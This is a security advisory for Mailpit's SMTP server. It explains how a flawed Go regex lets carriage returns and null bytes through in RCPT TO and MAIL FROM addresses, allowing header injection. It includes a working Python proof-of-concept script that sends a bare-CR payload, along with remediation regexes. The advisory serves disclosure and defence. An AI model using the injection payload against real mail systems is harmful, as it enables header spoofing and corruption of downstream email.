# [M] Mailpit has an SMTP Header Injection via Regex Bypass

## Summary
Severity: Medium
Advisory: GHSA-54wq-72mp-cq7c
CVE: CVE-2026-23829
CWE: CWE-150, CWE-93
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-01-20
Source: https://github.com/advisories/GHSA-54wq-72mp-cq7c
Type: github-advisory

## Affected
- Go: `github.com/axllent/mailpit` — affected >=0 <1.28.3

## Details
# Vulnerability Report: SMTP Header Injection via Regex Bypass

**Vulnerable Code:** `mailpit/internal/smtpd/smtpd.go`

## Executive Summary
Mailpit's SMTP server is vulnerable to **Header Injection** due to an insufficient Regular Expression used to validate `RCPT TO` and `MAIL FROM` addresses. An attacker can inject arbitrary SMTP headers (or corrupt existing ones) by including carriage return characters (`\r`) in the email address. This header injection occurs because the regex intended to filter control characters fails to exclude `\r` and `\n` when used inside a character class.

## RFC Compliance & Design Analysis
**"Is this behavior intentional for a testing tool?"**
No. While testing tools are often permissive, this specific behavior violates the core SMTP protocol and fails the developer's own intent.

1.  **RFC 5321 Violation:** The SMTP protocol strictly forbids Control Characters (CR, LF, Null) in the envelope address (`Mailbox`).
    *   *RFC 5321 Section 4.1.2:* A `Mailbox` consists of an `Atom` or `Quoted-string`. An `Atom` explicitly excludes "specials, SPACE and CTLs" (Control Characters).
2.  **Failed Intent:** The existence of `\v` in the regex `[^<>\v]` proves the developer **intended** to block vertical whitespace. The vulnerability is that `\v` in Go regex (`re2`) inside brackets `[]` matches *only* Vertical Tab, not CR/LF. If the design were to allow everything, the `\v` exclusion wouldn't exist.
3.  **Data Corruption:** Allowing `\r` results in the generation of malformed `.eml` files where the `Received` header is broken. This is not a feature; it's a bug that creates invalid email files.
4. RFC 5321 also enforces address lengths which are not applied in Mailpit.

## Technical Analysis

### The Flaw
The vulnerability exists in the regex definitions used to parse SMTP commands:

```go
// internal/smtpd/smtpd.go:32-33
rcptToRE   = regexp.MustCompile(`(?i)TO: ?<([^<>\v]+)>( |$)(.*)?`)
mailFromRE = regexp.MustCompile(`(?i)FROM: ?<(|[^<>\v]+)>( |$)(.*)?`)
```

The developer likely intended `[^<>\v]` to mean "Match anything that is NOT a `<` OR `>` OR `Vertical Whitespace`".

However, in Go's `regexp` (RE2) syntax, the behavior of `\v` changes depending on context:
- **Outside** brackets: `\v` matches all vertical whitespace: `[\n\v\f\r\x85\u2028\u2029]`.
- **Inside** brackets (`[...]`): `\v` matches **only** the Vertical Tab character (`\x0B`).

**Result:** The regex `[^<>\v]` **allows** Carriage Return (`\r`) and Line Feed (`\n`) characters to pass through, as they are not `<` or `>` or `\x0B`.

### Exploit Scenario
### Exploit Scenario
When Mailpit constructs the `Received` header, it uses the validated recipient address directly:

```go
// internal/smtpd/smtpd.go:865
buffer.WriteString(fmt.Sprintf("        for <%s>; %s\r\n", to[0], now))
```

If `to[0]` contains `victim\rINJECTED-HEADER: YES`, the resulting string in memory becomes:

```text
        for <victim\rINJECTED-HEADER: YES>; ...
```

While `bufio.ReadString` prevents injecting immediate `\n` (newlines), `\r` (Carriage Return) bypasses this check. 

**The Result:** The stored EML file contains a "Bare CR".
- **RFC Violation:** RFC 5321 strictly forbids Bare CR. Lines must end in CRLF.
- **UI Behavior:** Browsers typically render Bare CR as a space, so it may look like `victim INJECTED` in the Mailpit UI.
- **Real Impact:** The raw email is corrupted. If this email is exported or relayed, downstream systems (Outlook, older MTAs) may interpret the Bare CR as a line break, triggering a full **Header Injection**. Furthermore, Mailpit failing to reject this gives developers a **false sense of security**, as their code might be generating malformed emails that work in Mailpit but fail in production (e.g., with Gmail or Exchange).

### Raw EML Verification
The following screenshot of the raw `.eml` file confirms that the `\r` character successfully broke the `Received` header structure in the stored file, effectively creating a new line for the injected content.

<img width="621" height="230" alt="image" src="https://github.com/user-attachments/assets/1611f07e-316d-436a-95d6-9b14c9a8ecc6" />

<img width="1058" height="441" alt="image" src="https://github.com/user-attachments/assets/9543d904-6e0a-4c8b-b283-abbe05b752d0" />

<img width="668" height="196" alt="image" src="https://github.com/user-attachments/assets/907e4467-aab6-4bb4-83ce-743af4f6ba8d" />



As seen in lines  of the screenshot:
```text
        for <victim
INJECTED_VIA_CR:YES>; Tue, 13 Jan ...
```
The `INJECTED_VIA_CR:YES` payload is treated as a start of a new line by the text editor (VS Code), which honors `\r` as a line break. This proves the injection matches the "Bare CR" attack vector.

## Additional Proof of Concepts

### 1. Null Byte Injection (`\x00`)
The regex `[^<>\v]+` also allows the Null Byte (`\x00`).
**Test:** `test_null_byte.py` sent `RCPT TO:<victim\x00-NULL-BYTE-HERE>`.
**Result:** Server accepted the message (`250 OK`).
**Impact:** The API returns an empty `[]` for the To field in the message summary, indicating the parser failure in the UI/API layer. The raw message content confirms the Null Byte is stored in the database.

### 3. Detailed Character Compatibility
Tests (0-127 ASCII) confirm that the regex `[^<>\v]` blocks **only** the following:
- `<` (Less Than)
- `>` (Greater Than)
- `\x0B` (Vertical Tab)

**Crucially, it ALLOWS:**
| Character | Hex | Regex Status | Network Status | Impact |
| :--- | :--- | :--- | :--- | :--- |
| **Carriage Return** | `\r` (`0x0D`) | **ALLOWED** | **Passed** | **Header Injection** |
| **Line Feed** | `\n` (`0x0A`) | **ALLOWED** | Blocked* | *Blocked by `bufio.ReadString`, not regex. |
| **Null Byte** | `\x00` (`0x00`) | **ALLOWED** | **Passed** | API DoS / Corrupt Data |
| **Tab** | `\t` (`0x09`) | **ALLOWED** | **Passed** | Formatting issues |
| **Delete** | `\x7F` (`0x7F`) | **ALLOWED** | **Passed** | Potential obfuscation |
| **Controls** | `0x01`-`0x1F` | **ALLOWED** | **Passed** | (Except `0x0A`, `0x0B`, `0x0D`) |

*This confirms that the regex fails to implement a proper "Safe Text" allowlist, defaulting instead to a flawed denylist.*

## Proof of Concept
The following Python script demonstrates the injection of a "bare CR" into the headers, which is successfully accepted by the server.

```python
import socket

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 1025))
    s.recv(1024)
    s.send(b"EHLO test.com\r\n")
    s.recv(1024)
    s.send(b"MAIL FROM:<attacker@evil.com>\r\n")
    s.recv(1024)
    
    # Injecting \r 
    payload = b"RCPT TO:<victim\rX-Injected: Yes>\r\n"
    s.send(payload)
    resp = s.recv(1024)
    print(f"Server Response: {resp.decode()}") # Expect 250 OK
    
    s.send(b"DATA\r\n")
    s.recv(1024)
    s.send(b"Subject: Test\r\n\r\nBody\r\n.\r\n")
    s.recv(1024)
    s.close()
    
exploit()
```

## Remediation
Update the regex to explicitly exclude `\r` and `\n`, or use the correct character class escape for control characters.

**Recommended Fix:**
Use `\x00-\x1F` to exclude all ASCII control characters.

```go
// Fix: Exclude all control characters explicitly
rcptToRE   = regexp.MustCompile(`(?i)TO: ?<([^<>\x00-\x1f]+)>( |$)(.*)?`)
mailFromRE = regexp.MustCompile(`(?i)FROM: ?<(|[^<>\x00-\x1f]+)>( |$)(.*)?`)
```

Alternatively, strictly exclude CR and LF:
```go
rcptToRE   = regexp.MustCompile(`(?i)TO: ?<([^<>\r\n]+)>( |$)(.*)?`)
```
## Classification & References
- **CWE-93:** [Improper Neutralization of CRLF Sequences ('CRLF Injection')](https://cwe.mitre.org/data/definitions/93.html)
- **CWE-150:** [Improper Neutralization of Escape, Meta, or Control Sequences](https://cwe.mitre.org/data/definitions/150.html)
- **OWASP:** [Injection Flaws](https://owasp.org/www-community/attacks/Injection_Flaws)
- **CAPEC-106:** [Command Injection](https://capec.mitre.org/data/definitions/106.html) (Related usage pattern)
- [[RFC 5321 Section 4.5.3.1 - Size Limits](https://datatracker.ietf.org/doc/html/rfc5321#section-4.5.3.1)](https://datatracker.ietf.org/doc/html/rfc5321#section-4.5.3.1)

## References
- https://github.com/axllent/mailpit/security/advisories/GHSA-54wq-72mp-cq7c
- https://nvd.nist.gov/vuln/detail/CVE-2026-23829
- https://github.com/axllent/mailpit/commit/36cc06c125954dec6673219dafa084e13cc14534
- https://github.com/axllent/mailpit
- https://github.com/axllent/mailpit/releases/tag/v1.28.3
